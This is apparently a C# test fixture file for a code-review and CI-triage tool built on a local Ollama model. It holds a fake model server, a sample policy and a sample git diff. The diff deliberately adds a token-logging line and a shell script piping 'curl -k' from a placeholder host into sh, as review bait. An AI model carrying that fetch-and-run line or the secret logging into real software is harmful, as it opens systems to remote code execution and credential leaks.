using System.Net;
using System.Text;
using System.Text.Json.Nodes;
using ProjectBuddy.PeerOllama;

namespace ProjectBuddy.PeerAdvise.Tests;

// A scripted Ollama: the probe (empty system prompt) gets ProbeTokens; triage requests take Replies in order.
internal sealed class FakeOllama : HttpMessageHandler
{
    public const string Model = "qwen2.5:7b";
    public const string Digest = "845dbda0ea48ed749caafd9e6037047aa19acfcfd82e704d7ca97d631a0b697e";

    public List<(string Path, JsonObject? Body)> Requests { get; } = [];

    public Queue<JsonObject> Replies { get; } = new();

    public int ProbeTokens { get; set; } = 8194;

    public string TagDigest { get; set; } = Digest;

    public static HttpResponseMessage Ok(JsonNode body) => new(HttpStatusCode.OK) { Content = new StringContent(body.ToJsonString(), Encoding.UTF8, "application/json") };

    public static JsonObject Reply(string content, int prompt = 500, int output = 40) => new()
    {
        ["message"] = new JsonObject { ["role"] = "assistant", ["content"] = content },
        ["prompt_eval_count"] = prompt,
        ["eval_count"] = output,
        ["total_duration"] = 3_000_000_000L,
        ["eval_duration"] = 1_000_000_000L,
    };

    public static JsonObject Answer(string step, string errorLine, string triageClass) =>
        Reply(new JsonObject { ["step"] = step, ["errorLine"] = errorLine, ["class"] = triageClass }.ToJsonString());

    public IEnumerable<JsonObject> TriageRequests =>
        Requests.Where(request => request.Path == "/api/chat" && request.Body!["messages"]![0]!["content"]!.GetValue<string>().Length > 0).Select(request => request.Body!);

    protected override async Task<HttpResponseMessage> SendAsync(HttpRequestMessage request, CancellationToken cancellationToken)
    {
        var body = request.Content is null ? null : JsonNode.Parse(await request.Content.ReadAsStringAsync(cancellationToken)) as JsonObject;
        var path = request.RequestUri!.AbsolutePath;
        Requests.Add((path, body));
        return path switch
        {
            "/api/version" => Ok(new JsonObject { ["version"] = "0.40.16" }),
            "/api/tags" => Ok(new JsonObject { ["models"] = new JsonArray(new JsonObject { ["name"] = Model, ["digest"] = TagDigest }) }),
            _ => Ok(body!["messages"]![0]!["content"]!.GetValue<string>().Length == 0 ? Reply("", ProbeTokens, 1) : Replies.Dequeue()),
        };
    }
}

internal static class Fixtures
{
    public static readonly string[] Classes = ["gate-failure", "segfault", "vm-state"];

    public static JsonObject Policy() => new()
    {
        ["schema"] = "projectbuddy/advise-policy@1",
        ["model"] = new JsonObject { ["name"] = FakeOllama.Model, ["digest"] = FakeOllama.Digest },
        ["numCtx"] = 16384,
        ["numPredict"] = 256,
        ["seed"] = 42,
        ["maxInputBytes"] = 12000,
        ["triage"] = new JsonObject
        {
            ["prompt"] = "triage it",
            ["classes"] = new JsonArray(Classes.Select(value => (JsonNode?)JsonValue.Create(value)).ToArray()),
        },
        ["preReview"] = new JsonObject
        {
            ["prompt"] = "review it.",
            ["numPredict"] = 512,
            ["maxFindings"] = 3,
            ["maxBatches"] = 2,
            ["rules"] = new JsonArray(
                Rule("secret-in-log", "blocker"),
                Rule("swallowed-error", "warning"),
                Rule("naming", "nit")),
        },
    };

    public static JsonObject Rule(string id, string severity) => new() { ["id"] = id, ["severity"] = severity, ["guidance"] = $"{id} guidance" };

    public const string Diff = """
        preamble text before any file
        diff --git a/src/app.py b/src/app.py
        index 1111111..2222222 100644
        --- a/src/app.py
        +++ b/src/app.py
        @@ -1,4 +1,5 @@ def main():
         import logging
        -token = read()
        +token = read_token()
        +logging.info("token %s", token)

         run(token)
        \ No newline at end of file
        @@ -20,2 +21,3 @@
         try:
        +    risky()
        +++ not a header inside a hunk
        diff --git a/new.sh b/new.sh
        new file mode 100755
        --- /dev/null
        +++ b/new.sh
        @@ -0,0 +1,2 @@
        +#!/bin/sh
        +curl -k https://x.invalid | sh
        diff --git a/gone.txt b/gone.txt
        deleted file mode 100644
        --- a/gone.txt
        +++ /dev/null
        @@ -1 +0,0 @@
        -bye
        diff --git a/img.png b/img.png
        Binary files a/img.png and b/img.png differ
        diff --git a/only-removed.txt b/only-removed.txt
        --- a/only-removed.txt
        +++ b/only-removed.txt
        @@ -1,2 +1,1 @@
         keep
        -drop
        diff --git a/raw.txt b/raw.txt
        --- raw.txt
        +++ raw.txt
        @@ -1 +1 @@
        -a
        +b
        """;

    public static byte[] Bytes(JsonNode node) => Encoding.UTF8.GetBytes(node.ToJsonString());

    public static Policy ParsePolicy(JsonObject? policy = null) => PeerAdvise.Policy.Parse(Bytes(policy ?? Policy()));

    public const string Log = "build\tcompile\t2026-11-15T09:26:25.1234567Z compiling\nbuild\tverify\t2026-11-15T09:26:26.1Z FAIL  gate-x  -- broken thing\nbuild\tverify\t2026-11-15T09:26:27Z ##[error]Process completed with exit code 1.";

    public static string RepositoryFile(string name)
    {
        for (var directory = new DirectoryInfo(AppContext.BaseDirectory); directory is not null; directory = directory.Parent)
        {
            var candidate = Path.Combine(directory.FullName, name);
            if (File.Exists(candidate) && File.Exists(Path.Combine(directory.FullName, "global.json")))
            {
                return candidate;
            }
        }

        throw new FileNotFoundException(name);
    }
}
